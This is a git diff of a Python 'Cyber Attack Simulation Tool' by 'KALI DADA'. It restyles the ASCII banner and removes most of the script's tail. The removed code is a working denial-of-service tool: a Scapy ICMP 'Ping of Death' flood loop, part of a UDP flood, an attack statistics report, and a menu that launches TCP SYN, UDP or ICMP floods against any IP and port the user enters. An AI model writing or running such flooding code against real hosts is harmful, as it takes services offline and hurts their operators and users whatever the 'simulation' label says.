@@ -55,25 +55,24 @@ def print_warning() -> None:
         time.sleep(1)
     os.system("clear")
 
-def print_kali_dada_banner():
+def print_kali_dada_banner() -> None:
     """Display the KALI DADA banner and website info."""
     os.system("clear")
     banner = f"""
-{GREEN}{BOLD}
-  /$$   /$$  /$$$$$$  /$$       /$$$$$$       /$$$$$$$   /$$$$$$  /$$$$$$$   /$$$$$$ 
-| $$  /$$/ /$$__  $$| $$      |_  $$_/      | $$__  $$ /$$__  $$| $$__  $$ /$$__  $$
-| $$ /$$/ | $$  \ $$| $$        | $$        | $$  \ $$| $$  \ $$| $$  \ $$| $$  \ $$
-| $$$$$/  | $$$$$$$$| $$        | $$        | $$  | $$| $$$$$$$$| $$  | $$| $$$$$$$$
-| $$  $$  | $$__  $$| $$        | $$        | $$  | $$| $$__  $$| $$  | $$| $$__  $$
-| $$\  $$ | $$  | $$| $$        | $$        | $$  | $$| $$  | $$| $$  | $$| $$  | $$
-| $$ \  $$| $$  | $$| $$$$$$$$ /$$$$$$      | $$$$$$$/| $$  | $$| $$$$$$$/| $$  | $$
-|__/  \__/|__/  |__/|________/|______/      |_______/ |__/  |__/|_______/ |__/  |__/
-               {CYAN}Welcome to KALI DADA's Cyber Attack Simulation Tool{RESET}
+{color_text('  /$$   /$$ /$$$$$$     /$$       /$$$$$$        /$$$$$$$   /$$$$$$  /$$$$$$$   /$$$$$$  ', 'GREEN')}
+{color_text('| $$  /$$/ /$$ __  $$  | $$      |_  $$_/      | $$__  $$  /$$__  $$| $$__  $$ /$$__  $$', 'GREEN')}
+{color_text('| $$ /$$/ | $$   \ $$  | $$        | $$        | $$  \ $$ | $$  \ $$| $$  \ $$| $$  \ $$', 'GREEN')}
+{color_text('| $$$$$/  | $$$$$$$$$  | $$        | $$        | $$  | $$ | $$$$$$$$| $$  | $$| $$$$$$$$', 'GREEN')}
+{color_text('| $$  $$  | $$___  $$  | $$        | $$        | $$  | $$ | $$__  $$| $$  | $$| $$__  $$', 'GREEN')}
+{color_text('| $$\  $$ | $$   | $$  | $$        | $$        | $$  | $$ | $$  | $$| $$  | $$| $$  | $$', 'GREEN')}
+{color_text('| $$ \\  $$| $$  | $$  | $$$$$$$$ /$$$$$$      | $$$$$$$/ | $$  | $$| $$$$$$$/ $$  | $$', 'GREEN')}
+{color_text('|__/  \\__/|__/  |__/  |________/|______/      |_______/  |__/  |__/|_______/|__/  |__/', 'GREEN')}
+               {color_text('Welcome to KALI DADA\'s Cyber Attack Simulation Tool', 'CYAN')}
 """
     print(banner)
-    print(f"{YELLOW}Created by: {NAME}{RESET}")
-    print(f"{CYAN}Website: sujallamichhane.com.np{RESET}")
-    print(f"{CYAN}[INFO] Visit: sujallamichhane.com.np for more cybersecurity insights!{RESET}\n")
+    print(f"{color_text('Created by: ', 'YELLOW')}{NAME}{COLORS['RESET']}")
+    print(f"{color_text('Website: ', 'CYAN')}sujallamichhane.com.np{COLORS['RESET']}")
+    print(f"{color_text('[INFO] Visit: ', 'CYAN')}sujallamichhane.com.np for more cybersecurity insights!{COLORS['RESET']}\n")
     time.sleep(1)
 
 def validate_ip(ip: str) -> bool:
@@ -160,102 +159,4 @@ def udp_flood(target_ip: str, target_port: int, duration: int) -> dict:
     except KeyboardInterrupt:
         print(color_text("\n🛑 Attack interrupted by user", "RED"))
 
-    stats["duration"] = time.time() - stats["start_time"]
-    return stats
-
-def ping_of_death(target_ip: str, duration: int) -> dict:
-    """Advanced Ping of Death with statistics tracking."""
-    stats = {"start_time": time.time(), "packet_count": 0, "total_size": 0}
-    print(color_text(f"\n🚀 Initiating Ping of Death on {target_ip}", "YELLOW"))
-
-    try:
-        while time.time() - stats["start_time"] < duration:
-            packet = IP(dst=target_ip) / ICMP() / (b"X" * PACKET_SIZES["ICMP"])
-            send(packet, verbose=False)
-            stats["packet_count"] += 1
-            stats["total_size"] += len(packet)
-            print(color_text(f"⏩ Packets: {stats['packet_count']} | Throughput: {stats['total_size']/1024:.2f} KB", "CYAN"), end="\r")
-    except KeyboardInterrupt:
-        print(color_text("\n🛑 Attack interrupted by user", "RED"))
-
-    stats["duration"] = time.time() - stats["start_time"]
-    return stats
-
-def generate_report(attack_type: str, stats: dict) -> None:
-    """Generate detailed attack report."""
-    print(color_text("\n📊 Attack Statistics:", "GREEN"))
-    print(f"⏱️  Duration: {stats['duration']:.2f} seconds")
-    print(f"📦 Packets Sent: {stats['packet_count']}")
-    print(f"🚚 Total Data: {stats['total_size']/1024:.2f} KB")
-    print(f"⚡ Rate: {stats['packet_count']/stats['duration']:.2f} pps")
-
-def main_flow() -> None:
-    """Main control flow with enhanced menu system."""
-    while True:
-        print(color_text("\n🔧 Main Menu:", "BOLD"))
-        print("1. TCP SYN Flood Attack")
-        print("2. UDP Flood Attack")
-        print("3. Ping of Death")
-        print("4. Exit")
-
-        choice = get_valid_input(
-            "Select option (1-4): ",
-            lambda x: x in {1, 2, 3, 4},
-            "Invalid option!",
-            cast_type=int
-        )
-
-        if choice == 4:
-            print(color_text("\n🛑 Exiting...", "RED"))
-            break
-
-        target_ip = get_valid_input(
-            "Target IP: ",
-            validate_ip,
-            "Invalid IP address!",
-            cast_type=str
-        )
-
-        if choice in [1, 2]:
-            target_port = get_valid_input(
-                "Target Port: ",
-                validate_port,
-                "Invalid port number!",
-                cast_type=int
-            )
-        else:
-            target_port = None
-
-        duration = get_valid_input(
-            "Duration (seconds): ",
-            lambda x: x > 0,
-            "Invalid duration!",
-            cast_type=int
-        )
-
-        if not perform_health_check(target_ip):
-            print(color_text(f"[ERROR] Target server {target_ip} seems down. Check the IP or try again later.", "RED"))
-            continue
-
-        if choice == 1:
-            stats = syn_flood(target_ip, target_port, duration)
-        elif choice == 2:
-            stats = udp_flood(target_ip, target_port, duration)
-        elif choice == 3:
-            stats = ping_of_death(target_ip, duration)
-
-        generate_report(attack_type=choice, stats=stats)
-
-        # After completing the attack, ask the user if they want to continue
-        continue_choice = input(color_text("Do you want to perform another attack? (y/n): ", "CYAN")).strip().lower()
-        if continue_choice != 'y':
-            print(color_text("Exiting...", "GREEN"))
-            break
-
-def main() -> None:
-    print_kali_dada_banner()
-    print_warning()
-    main_flow()
-
-if __name__ == "__main__":
-    main()
+   
